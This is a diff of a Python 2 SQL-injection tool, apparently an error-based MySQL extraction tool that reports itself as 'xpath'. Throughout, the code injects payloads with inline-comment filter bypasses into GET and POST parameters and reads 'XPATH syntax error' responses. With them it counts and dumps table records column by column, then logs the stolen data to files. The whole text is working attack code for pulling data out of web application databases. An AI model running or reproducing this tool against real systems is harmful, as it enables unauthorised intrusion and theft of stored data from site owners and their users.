-                                                                                                else:
-                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-                                                                                                    
-                                                                                                if 'LIMIT%20' in tempQuery:
-                                                                                                    tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
-                                                                                                else:
-                                                                                                    tempQuery = tempQuery
-                                                                                                    
-                                                                                                RecordsnumpQuery = tempQuery % (columns)
-                                                                                                try:
-                                                                                                    req = Request(RecordsnumpQuery, headers={'User-agent':ua})
-                                                                                                    resp = urlopen(req, timeout=30)
-                                                                                                except URLError as e:
-                                                                                                    URLError()
-                                                                                                    if temp == 0:
-                                                                                                        temp = 0
-                                                                                                    else:
-                                                                                                        temp = temp
-                                                                                                    sleep(1)
-                                                                                                    pass
-                                                                                                except HTTPError as e:
-    ##                                                                                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                                                    sleep(1)
-                                                                                                    pass
-                                                                                                except (IOError, httplib.HTTPException) as e:
-                                                                                                    ConnTimeOut()
-                                                                                                    if temp == 0:
-                                                                                                        temp = 0
-                                                                                                    else:
-                                                                                                        temp = temp
-                                                                                                    pass
-                                                                                                except KeyboardInterrupt:
-                                                                                                    print fg + sb + "Database: %s" % db
-                                                                                                    print fg + sb + "Table: %s" % tbl
-                                                                                                    print fg + sb + "[Dumped "+str(temp)+" records]:"
-                                                                                                    print fg + sb + tmp
-                                                                                                    fd.write(dumps)
-                                                                                                    fd.close()
-                                                                                                    f.write(infos)
-                                                                                                    f.close()
-                                                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-                                                                                                    KeyBoardInterrupt()
-                                                                                                    break
-                                                                                                else:
-                                                                                                    try:
-                                                                                                        respdata = resp.read()
-                                                                                                        records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                                        if 'XPATH syntax error' in respdata:
-                                                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
-                                                                                                            infos += "[*] %s\n" % records
-                                                                                                            dumps += "{},".format(records)
-                                                                                                            tmp += "[*] %s\n" % records
-                                                                                                            t += 1
-                                                                                                            
-                                                                                                    except IndexError as e:
-                                                                                                        pass
-                                                                                                    except Exception as e:
-                                                                                                        pass
-                                                                                                    except KeyboardInterrupt:
-                                                                                                        KeyBoardInterrupt()
-                                                                                                        break  
-                                                                                            check = len(ColumnList)
-                                                                                            if t == check:
-                                                                                                dumps += "\n"
-                                                                                                temp += 1
-                                                                                            else:
-                                                                                                pass
-
-                                                                                        print fg + sb + "Database: %s" % db
-                                                                                        print fg + sb + "Table: %s" % tbl
-                                                                                        print fg + sb + "["+str(nor)+" records]"
-                                                                                        print fg + sb + tmp
-                                                                                            
-                                                                                except IndexError as e:
-                                                                                    pass
-                                                                                except Exception as e:
-                                                                                    pass
-                                                                                except KeyboardInterrupt:
-                                                                                    KeyBoardInterrupt()
-                                                                                    break
-                                                                    if dbvul:
-                                                                        break
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if Query_Test:
-                                            break            
-                        if vul:
-                            break
-                    except (TypeError, IOError, IndexError):
-                        pass
-                    except KeyboardInterrupt:
-                        KeyBoardInterrupt()
-                        break
-            f.write(infos)
-            fd.write(dumps)
-            fd.close()
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-            
-        else:
-            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
-            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
-            with open(logs, "r") as prev_session:
-                for line in islice(prev_session,1,7):
-                    out = line.rstrip()
-                    if out:
-                        print fw + sn + out
-                        infos += out+"\n"
-            prev_session.close()
-            HTTPResponses(url, data)
-            Query_Test = False
-            tempfread = tempf.readline()
-            if wsr and war:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                infos += "web server technology: %s, %s\n" % (war, wsr)
-            else:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                infos += "web server technology: %s\n" % wsr
-            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-            infos += "the back-end DBMS: MySQL\n"
-            out = ', '.join(map(str,ColumnList))
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
-            for QueryIndex in REC_COUNT_FROM_TBL:
-                if not Query_Test:
-                    QueryToTest = QueryIndex % (db,tbl)
-                    if '0x72306f74' in tempfread:
-                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                        try:
-                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                            resp = urlopen(req, timeout=10)
-                        except URLError as e:
-                            URLError()
-                            sleep(1)
-                            pass
-                        except HTTPError as e:
-##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                            sleep(1)
-                            pass
-                        except (IOError, httplib.HTTPException) as e:
-                            ConnTimeOut()
-                            pass
-                        except KeyboardInterrupt:
-                            KeyBoardInterrupt()
-                            break
-                        else:
-                            try:
-                                respdata = resp.read()
-                                no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                if 'XPATH syntax error' in respdata:
-                                    Query_Test = True
-                                    if '0' in no_of_recs:
-                                        print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                    try:
+                                        respdata = resp.read()
+                                        retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                        if 'XPATH syntax error' in respdata:
+                                            vul = True
+                                            print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
+                                            infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                            print fw + sn + 'Parameter: (GET)'
+                                            infos += 'Parameter: (GET)\n'
+                                            print fw + sn + '\tType: error-based'
+                                            infos += '\tType: error-based\n'
+                                            print fw + sn + '\tTitle: %s' % test
+                                            infos += '\tTitle: %s\n' % test
+                                            print fw + sn + '\tPayload: %s' % tgt
+                                            infos += '\tPayload: %s\n' % tgt
+                                            # ----------------------------------------
+                                            # for later usage of dumiping other things
+                                            CreatePayloadFile()
+                                            with open(payload,'w') as ft:
+                                                ft.write('%s' % tgt)
+                                                ft.close()
+                                            # ----------------------------------------
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                    except IndexError as e:
+                                        pass
+                                    except Exception as e:
+                                        pass
+                                    except KeyboardInterrupt:
+                                        KeyBoardInterrupt()
                                         break
                                     else:
-                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
-                                        dbvul = False
-                                        for QueryIndex in REC_DUMP_FROM_TBL:
-                                            if not dbvul:
-                                                QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
-                                                if '0x72306f74' in tempfread:
-                                                    FinalDumpQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
+                                        Query_Test = False
+                                        if wsr and war:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                                            infos += "web server technology: %s, %s\n" % (war, wsr)
+                                        else:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                                            infos += "web server technology: %s\n" % wsr
+                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                                        infos += "the back-end DBMS: MySQL\n"
+                                        out = ', '.join(map(str,ColumnList))
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
+                                        for QueryIndex in REC_COUNT_FROM_TBL:
+                                            if not Query_Test:
+                                                QueryToTest = QueryIndex % (db,tbl)
+                                                if '0x72306f74' in tgt:
+                                                    FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                     try:
-                                                        req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                        req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                         resp = urlopen(req, timeout=10)
                                                     except URLError as e:
                                                         URLError()
@@ -5130,112 +4956,152 @@ def dumpTblRecords(url, data, db, tbl, col):
                                                     else:
                                                         try:
                                                             respdata = resp.read()
-                                                            isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                             if 'XPATH syntax error' in respdata:
-                                                                dbvul = True
-                                                                if '%20' in FinalDumpQuery_replaced:
-                                                                    testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
+                                                                Query_Test = True
+                                                                if '0' in no_of_recs:
+                                                                    print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                                                    break
                                                                 else:
-                                                                    testQuery = FinalDumpQuery_replaced
-                                                                
-                                                                if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
-                                                                    DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')
+                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                                                    dbvul = False
+                                                                    for QueryIndex in REC_DUMP_FROM_TBL:
+                                                                        if not dbvul:
+                                                                            QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
+                                                                            if '0x72306f74' in tgt:
+                                                                                FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                                                try:
+                                                                                    req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                                                    resp = urlopen(req, timeout=10)
+                                                                                except URLError as e:
+                                                                                    URLError()
+                                                                                    sleep(1)
+                                                                                    pass
+                                                                                except HTTPError as e:
+        ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                    sleep(1)
+                                                                                    pass
+                                                                                except (IOError, httplib.HTTPException) as e:
+                                                                                    ConnTimeOut()
+                                                                                    pass
+                                                                                except KeyboardInterrupt:
+                                                                                    KeyBoardInterrupt()
+                                                                                    break
+                                                                                else:
+                                                                                    try:
+                                                                                        respdata = resp.read()
+                                                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                        if 'XPATH syntax error' in respdata:
+                                                                                            dbvul = True
+                                                                                            if '%20' in FinalDumpQuery_replaced:
+                                                                                                testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
+                                                                                            else:
+                                                                                                testQuery = FinalDumpQuery_replaced
+                                                                                            
+                                                                                            if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
+                                                                                                DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')
 
-                                                                elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
-                                                                    DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
-                                                                    
-                                                                else:
-                                                                    pass
-                                                                
-                                                                temp = 0
-                                                                nor = int(no_of_recs)
-                                                                infos += "Database: %s\n" % db
-                                                                infos += "Table: %s\n" % tbl
-                                                                infos += "["+str(nor)+" recs]\n"
-                                                                tmp = ""
-                                                                while temp < nor:
-                                                                    t = 0
-                                                                    for columns in ColumnList:
-                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                        elif 'LIMIT%%20' in DbDumpQuery:
-                                                                            tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
-                                                                        else:
-                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-                                                                            
-                                                                        if 'LIMIT%20' in tempQuery:
-                                                                            tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
-                                                                        else:
-                                                                            tempQuery = tempQuery
-                                                                            
-                                                                        RecordsnumpQuery = tempQuery % (columns)
-                                                                        try:
-                                                                            req = Request(RecordsnumpQuery, headers={'User-agent':ua})
-                                                                            resp = urlopen(req, timeout=30)
-                                                                        except URLError as e:
-                                                                            URLError()
-                                                                            if temp == 0:
-                                                                                temp = 0
-                                                                            else:
-                                                                                temp = temp
-                                                                            sleep(1)
-                                                                            pass
-                                                                        except HTTPError as e:
-    ##                                                                        print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                            sleep(1)
-                                                                            pass
-                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                            ConnTimeOut()
-                                                                            if temp == 0:
-                                                                                temp = 0
-                                                                            else:
-                                                                                temp = temp
-                                                                                
-                                                                        except KeyboardInterrupt:
-                                                                            print fw + sn + "Database: %s" % db
-                                                                            print fw + sn + "Table: %s" % tbl
-                                                                            print fw + sn + "[Dumped "+str(temp)+" records]:"
-                                                                            print fw + sn + tmp
-                                                                            fd.write(dumps)
-                                                                            fd.close()
-                                                                            f.write(infos)
-                                                                            f.close()
-                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-                                                                            KeyBoardInterrupt()
+                                                                                            elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
+                                                                                                DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
+                                                                                                
+                                                                                            else:
+                                                                                                pass
+                                                                                            
+                                                                                            temp = 0
+                                                                                            nor = int(no_of_recs)
+                                                                                            infos += "Database: %s\n" % db
+                                                                                            infos += "Table: %s\n" % tbl
+                                                                                            infos += "["+str(nor)+" recs]\n"
+                                                                                            tmp = ""
+                                                                                            while temp < nor:
+                                                                                                t = 0
+                                                                                                for columns in ColumnList:
+                                                                                                    if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                                                        tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                                                    elif 'LIMIT%%20' in DbDumpQuery:
+                                                                                                        tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
+                                                                                                    else:
+                                                                                                        tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                                                        
+                                                                                                    if 'LIMIT%20' in tempQuery:
+                                                                                                        tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
+                                                                                                    else:
+                                                                                                        tempQuery = tempQuery
+                                                                                                        
+                                                                                                    RecordsnumpQuery = tempQuery % (columns)
+                                                                                                    try:
+                                                                                                        req = Request(RecordsnumpQuery, headers={'User-agent':ua})
+                                                                                                        resp = urlopen(req, timeout=30)
+                                                                                                    except URLError as e:
+                                                                                                        URLError()
+                                                                                                        if temp == 0:
+                                                                                                            temp = 0
+                                                                                                        else:
+                                                                                                            temp = temp
+                                                                                                        sleep(1)
+                                                                                                        pass
+                                                                                                    except HTTPError as e:
+        ##                                                                                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                                        sleep(1)
+                                                                                                        pass
+                                                                                                    except (IOError, httplib.HTTPException) as e:
+                                                                                                        ConnTimeOut()
+                                                                                                        if temp == 0:
+                                                                                                            temp = 0
+                                                                                                        else:
+                                                                                                            temp = temp
+                                                                                                        pass
+                                                                                                    except KeyboardInterrupt:
+                                                                                                        print fg + sb + "Database: %s" % db
+                                                                                                        print fg + sb + "Table: %s" % tbl
+                                                                                                        print fg + sb + "[Dumped "+str(temp)+" records]:"
+                                                                                                        print fg + sb + tmp
+                                                                                                        fd.write(dumps)
+                                                                                                        fd.close()
+                                                                                                        f.write(infos)
+                                                                                                        f.close()
+                                                                                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                                                                                                        KeyBoardInterrupt()
+                                                                                                        break
+                                                                                                    else:
+                                                                                                        try:
+                                                                                                            respdata = resp.read()
+                                                                                                            records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                                            if 'XPATH syntax error' in respdata:
+                                                                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
+                                                                                                                infos += "[*] %s\n" % records
+                                                                                                                dumps += "{},".format(records)
+                                                                                                                tmp += "[*] %s\n" % records
+                                                                                                                t += 1
+                                                                                                                
+                                                                                                        except IndexError as e:
+                                                                                                            pass
+                                                                                                        except Exception as e:
+                                                                                                            pass
+                                                                                                        except KeyboardInterrupt:
+                                                                                                            KeyBoardInterrupt()
+                                                                                                            break  
+                                                                                                check = len(ColumnList)
+                                                                                                if t == check:
+                                                                                                    dumps += "\n"
+                                                                                                    temp += 1
+                                                                                                else:
+                                                                                                    pass
+
+                                                                                            print fg + sb + "Database: %s" % db
+                                                                                            print fg + sb + "Table: %s" % tbl
+                                                                                            print fg + sb + "["+str(nor)+" records]"
+                                                                                            print fg + sb + tmp
+                                                                                                
+                                                                                    except IndexError as e:
+                                                                                        pass
+                                                                                    except Exception as e:
+                                                                                        pass
+                                                                                    except KeyboardInterrupt:
+                                                                                        KeyBoardInterrupt()
+                                                                                        break
+                                                                        if dbvul:
                                                                             break
-                                                                        else:
-                                                                            try:
-                                                                                respdata = resp.read()
-                                                                                records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                if 'XPATH syntax error' in respdata:
-                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
-                                                                                    infos += "[*] %s\n" % records
-                                                                                    dumps += "{},".format(records)
-                                                                                    tmp += "[*] %s\n" % records
-                                                                                    rl = len (records) + 1
-                                                                                    t += 1
-                                                                                    
-                                                                            except IndexError as e:
-                                                                                pass
-                                                                            except Exception as e:
-                                                                                pass
-                                                                            except KeyboardInterrupt:
-                                                                                KeyBoardInterrupt()
-                                                                                break
-                                                                            
-                                                                    check = len(ColumnList)
-                                                                    if t == check:
-                                                                        dumps += "\n"
-                                                                        temp += 1
-                                                                    else:
-                                                                        pass
-                                                                    
-                                                                print fw + sn + "Database: %s" % db
-                                                                print fw + sn + "Table: %s" % tbl
-                                                                print fw + sn + "["+str(nor)+" records]"
-                                                                print fw + sn + tmp
-                                                                
-                                                                    
                                                         except IndexError as e:
                                                             pass
                                                         except Exception as e:
@@ -5243,23 +5109,240 @@ def dumpTblRecords(url, data, db, tbl, col):
                                                         except KeyboardInterrupt:
                                                             KeyBoardInterrupt()
                                                             break
-                                            if dbvul:
-                                                break
-                            except IndexError as e:
+                                            if Query_Test:
+                                                break            
+                            if vul:
+                                break
+                        except (TypeError, IOError, IndexError):
+                            pass
+                        except KeyboardInterrupt:
+                            KeyBoardInterrupt()
+                            break
+                f.write(infos)
+                fd.write(dumps)
+                fd.close()
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                pass
+            
+        else:
+            try:
+                print fw + sn + "xpath resumed the following injection point(s) from stored session:"
+                infos += "\nxpath resumed the following injection point(s) from stored session:\n"
+                with open(logs, "r") as prev_session:
+                    for line in islice(prev_session,1,7):
+                        out = line.rstrip()
+                        if out:
+                            print fw + sn + out
+                            infos += out+"\n"
+                prev_session.close()
+                HTTPResponses(url, data)
+                Query_Test = False
+                tempfread = tempf.readline()
+                if wsr and war:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                    infos += "web server technology: %s, %s\n" % (war, wsr)
+                else:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                    infos += "web server technology: %s\n" % wsr
+                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                infos += "the back-end DBMS: MySQL\n"
+                out = ', '.join(map(str,ColumnList))
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
+                for QueryIndex in REC_COUNT_FROM_TBL:
+                    if not Query_Test:
+                        QueryToTest = QueryIndex % (db,tbl)
+                        if '0x72306f74' in tempfread:
+                            FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
+                            try:
+                                req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
+                                resp = urlopen(req, timeout=10)
+                            except URLError as e:
+                                URLError()
+                                sleep(1)
                                 pass
-                            except Exception as e:
+                            except HTTPError as e:
+    ##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                sleep(1)
+                                pass
+                            except (IOError, httplib.HTTPException) as e:
+                                ConnTimeOut()
                                 pass
                             except KeyboardInterrupt:
                                 KeyBoardInterrupt()
                                 break
-                if Query_Test:
-                    break
-            
-            f.write(infos)
-            fd.write(dumps)
-            fd.close()
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                            else:
+                                try:
+                                    respdata = resp.read()
+                                    no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                    if 'XPATH syntax error' in respdata:
+                                        Query_Test = True
+                                        if '0' in no_of_recs:
+                                            print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                            break
+                                        else:
+                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                            dbvul = False
+                                            for QueryIndex in REC_DUMP_FROM_TBL:
+                                                if not dbvul:
+                                                    QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
+                                                    if '0x72306f74' in tempfread:
+                                                        FinalDumpQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
+                                                        try:
+                                                            req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                            resp = urlopen(req, timeout=10)
+                                                        except URLError as e:
+                                                            URLError()
+                                                            sleep(1)
+                                                            pass
+                                                        except HTTPError as e:
+        ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                            sleep(1)
+                                                            pass
+                                                        except (IOError, httplib.HTTPException) as e:
+                                                            ConnTimeOut()
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                                        else:
+                                                            try:
+                                                                respdata = resp.read()
+                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                if 'XPATH syntax error' in respdata:
+                                                                    dbvul = True
+                                                                    if '%20' in FinalDumpQuery_replaced:
+                                                                        testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
+                                                                    else:
+                                                                        testQuery = FinalDumpQuery_replaced
+                                                                    
+                                                                    if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
+                                                                        DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')
+
+                                                                    elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
+                                                                        DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
+                                                                        
+                                                                    else:
+                                                                        pass
+                                                                    
+                                                                    temp = 0
+                                                                    nor = int(no_of_recs)
+                                                                    infos += "Database: %s\n" % db
+                                                                    infos += "Table: %s\n" % tbl
+                                                                    infos += "["+str(nor)+" recs]\n"
+                                                                    tmp = ""
+                                                                    while temp < nor:
+                                                                        t = 0
+                                                                        for columns in ColumnList:
+                                                                            if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                                tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                            elif 'LIMIT%%20' in DbDumpQuery:
+                                                                                tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
+                                                                            else:
+                                                                                tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                                
+                                                                            if 'LIMIT%20' in tempQuery:
+                                                                                tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
+                                                                            else:
+                                                                                tempQuery = tempQuery
+                                                                                
+                                                                            RecordsnumpQuery = tempQuery % (columns)
+                                                                            try:
+                                                                                req = Request(RecordsnumpQuery, headers={'User-agent':ua})
+                                                                                resp = urlopen(req, timeout=30)
+                                                                            except URLError as e:
+                                                                                URLError()
+                                                                                if temp == 0:
+                                                                                    temp = 0
+                                                                                else:
+                                                                                    temp = temp
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except HTTPError as e:
+        ##                                                                        print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                ConnTimeOut()
+                                                                                if temp == 0:
+                                                                                    temp = 0
+                                                                                else:
+                                                                                    temp = temp
+                                                                                    
+                                                                            except KeyboardInterrupt:
+                                                                                print fw + sn + "Database: %s" % db
+                                                                                print fw + sn + "Table: %s" % tbl
+                                                                                print fw + sn + "[Dumped "+str(temp)+" records]:"
+                                                                                print fw + sn + tmp
+                                                                                fd.write(dumps)
+                                                                                fd.close()
+                                                                                f.write(infos)
+                                                                                f.close()
+                                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                                                                                KeyBoardInterrupt()
+                                                                                break
+                                                                            else:
+                                                                                try:
+                                                                                    respdata = resp.read()
+                                                                                    records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
+                                                                                        infos += "[*] %s\n" % records
+                                                                                        dumps += "{},".format(records)
+                                                                                        tmp += "[*] %s\n" % records
+                                                                                        rl = len (records) + 1
+                                                                                        t += 1
+                                                                                        
+                                                                                except IndexError as e:
+                                                                                    pass
+                                                                                except Exception as e:
+                                                                                    pass
+                                                                                except KeyboardInterrupt:
+                                                                                    KeyBoardInterrupt()
+                                                                                    break
+                                                                                
+                                                                        check = len(ColumnList)
+                                                                        if t == check:
+                                                                            dumps += "\n"
+                                                                            temp += 1
+                                                                        else:
+                                                                            pass
+                                                                        
+                                                                    print fw + sn + "Database: %s" % db
+                                                                    print fw + sn + "Table: %s" % tbl
+                                                                    print fw + sn + "["+str(nor)+" records]"
+                                                                    print fw + sn + tmp
+                                                                    
+                                                                        
+                                                            except IndexError as e:
+                                                                pass
+                                                            except Exception as e:
+                                                                pass
+                                                            except KeyboardInterrupt:
+                                                                KeyBoardInterrupt()
+                                                                break
+                                                if dbvul:
+                                                    break
+                                except IndexError as e:
+                                    pass
+                                except Exception as e:
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break
+                    if Query_Test:
+                        break
+                
+                f.write(infos)
+                fd.write(dumps)
+                fd.close()
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                pass
 
 #-------------------------------------------------------------------------------------------------------------------#
 #                                           POST DATA INJECTION                                                     #
@@ -5269,344 +5352,92 @@ def dumpTblRecords(url, data, db, tbl, col):
         try:
             tempf = open(payload,'r')
         except (Exception, IOError) as e:
-            if 'No such file or directory' in e:
-                vul = False
-                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
-                    try:
-                        if not vul:
-                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
-                            if '*' in data:
-                                first, last = data.split('*')
-                                tgt = first + temp + last
-                                
-                            else:
-                                tgt = data + temp
+            try:
+                if 'No such file or directory' in e:
+                    vul = False
+                    for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
+                        try:
+                            if not vul:
+                                temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
+                                if '*' in data:
+                                    first, last = data.split('*')
+                                    tgt = first + temp + last
+                                    
+                                else:
+                                    tgt = data + temp
 
-                            try:
-                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
-                                req = Request(url, data=tgt, headers={'User-agent':ua})
-                                HTTPReqCount += 1
-                                resp = urlopen(req, timeout=10)
-                            except URLError as e:
-                                URLError()
-                                sleep(1)
-                                pass
-                            except HTTPError as e:
-##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                sleep(1)
-                                pass
